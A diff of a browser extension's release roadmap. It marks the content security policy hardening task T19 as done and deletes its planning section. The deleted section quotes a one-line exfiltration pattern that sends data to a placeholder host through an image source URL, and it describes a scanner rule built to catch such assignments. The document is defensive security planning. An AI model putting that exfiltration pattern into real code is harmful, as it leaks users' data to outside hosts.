@@ -43,33 +43,15 @@ implements them twice. Every one has tests.
 | **F40** | The text colour is a well beside the font menu, opening the same palette the border and fill controls open | `src/ui/result.*`, D40 |
 | **T27** | Picking Arrow could still draw a line. The tool and the arrowheads are reconciled in both directions | `src/ui/editor.js`, D41 |
 | **F41** | Hover cursors, a hover outline, and Escape to abandon a drag. Part of F27 | `src/ui/editor.js`, D42 |
+| **T19** | The content security policy names every directive. `connect-src 'none'` never covered a remote subresource, and an absent directive with no `default-src` is unrestricted | `manifest.json`, `test/lib/scan.js`, D15 |
 
-**Still open from the 1.7.0 list below:** T19, T2, T11, F1, F21, F2, F26.
+**Still open from the 1.7.0 list below:** T2, T11, F1, F21, F2, F26.
 **Still open from 1.8.0:** F6, F4, F27.
 
 # Release 1.7.0: the repairs, and the free wins
 
 Removes every known silent failure and closes the one real hole in the security
 model. Nothing here needs new UI beyond a menu item and a slider.
-
-### T19 (P1) Harden the content security policy
-
-**Goal.** `connect-src 'none'` does not block a remote subresource. Our policy names
-no `default-src`, so `img-src`, `style-src`, `font-src` and `media-src` are
-unrestricted, and `new Image().src = 'https://x/?d=' + data` is an exfiltration path
-that neither the CSP nor `test/lib/scan.js` stops. See
-[docs/DECISIONS.md](docs/DECISIONS.md) D15.
-
-**Acceptance.**
-- `manifest.json` `extension_pages` reads:
-  `script-src 'self'; object-src 'none'; connect-src 'none'; frame-src 'none'; img-src 'self' data: blob:; style-src 'self' 'unsafe-inline'; font-src 'self'; media-src 'none'; base-uri 'none'; form-action 'none'`
-- **Both extension pages still render**, including the inline `<style>` blocks, the
-  icons, the canvas and a `blob:` export preview. Check this in a real browser, not
-  only in tests: a wrong `style-src` blanks the UI.
-- `test/lib/scan.js` gains a rule for remote subresource assignment (`.src =` or
-  `srcset` with an `http(s):` literal, and `url(http` in CSS).
-- `test/invariants.test.js` asserts every directive above is present, so a future
-  edit cannot quietly drop one.
 
 ### T2 (P1) Add `encodeOrThrow` and stop the silent export failure
 
